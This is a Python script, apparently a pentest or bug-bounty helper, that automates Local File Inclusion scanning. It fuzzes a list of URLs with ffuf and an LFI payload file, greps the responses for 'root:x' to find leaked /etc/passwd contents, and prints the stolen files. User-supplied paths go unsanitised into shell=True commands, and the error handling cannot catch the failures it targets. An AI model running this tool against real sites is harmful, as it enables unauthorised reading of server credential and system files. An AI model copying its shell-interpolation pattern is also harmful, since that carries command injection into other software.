#!/usr/bin/env python3

import os
import subprocess
import colorama
import argparse


def parser_arguments():
    parser = argparse.ArgumentParser(description="LFI Scan.")
    parser.add_argument("-l", "--lfi-list", help="Specify a URL list for LFI ", required=True)
    args = parser.parse_args()
    return args

def scan_lfi():
    args = parser_arguments()
    target_list = args.lfi_list
    
    ## LFI
    try:
        lfi_fuzzed_urls = "lfi_fuzzed_urls.txt"
        lfi_temp_results = "lfi_temp_results.txt"
        clean_lfi_command = f"params -u {target_list} -o {lfi_fuzzed_urls}"
        clean_lfi_out = subprocess.Popen(clean_lfi_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        output = clean_lfi_out.communicate()
    
    except subprocess.CalledProcessError as e:
        print(colorama.Fore.RED + f"Error cleaning LFI: {e.stderr}")

    try:
        lfi_command = f"for URL in $(<{lfi_fuzzed_urls}); do (ffuf -u \"${{URL}}\" -w tools/src/lfipayloads.txt:FUZZ -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done"
        lfi_out = subprocess.Popen(lfi_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable="/bin/bash")
        stdout, stderr = lfi_out.communicate()
                
    except subprocess.CalledProcessError as e:
        print(colorama.Fore.RED + f"Error running LFI: {e.stderr}")

    try:
        search_lfi_command = f"grep -Ril 'root:x' ffuf_lfi_results/ | tee {lfi_temp_results}"
        search_lfi_out = subprocess.Popen(search_lfi_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        output = search_lfi_out.communicate()

    except subprocess.CalledProcessError as e:
        print(colorama.Fore.RED + f"Error searching LFI: {e.stderr}")

    try:
        ## Inside File
        with open('vuln.txt', "w") as f:
            pass
        file_command =  "grep -o 'ffuf_lfi_results/[^ ]*' lfi_temp_results.txt | xargs -I {} sh -c 'echo \"=============000000============\" >> vuln.txt; cat {} >> vuln.txt; echo \"\" >> vuln.txt'"
        file_out = subprocess.Popen(file_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        output = file_out.communicate()

        ## Print
        with open("vuln.txt", "r") as f:
            print(f.read())

    except subprocess.CalledProcessError as e:
        print(colorama.Fore.RED + f"Error printing LFI: {e.stderr}")
        
    subprocess.run("rm -rf ffuf_lfi_results", shell=True)
    subprocess.run("rm -rf lfi_temp_results.txt lfi_fuzzed_urls.txt vuln.txt", shell=True)
                    
    
if __name__ == "__main__":
    scan_lfi()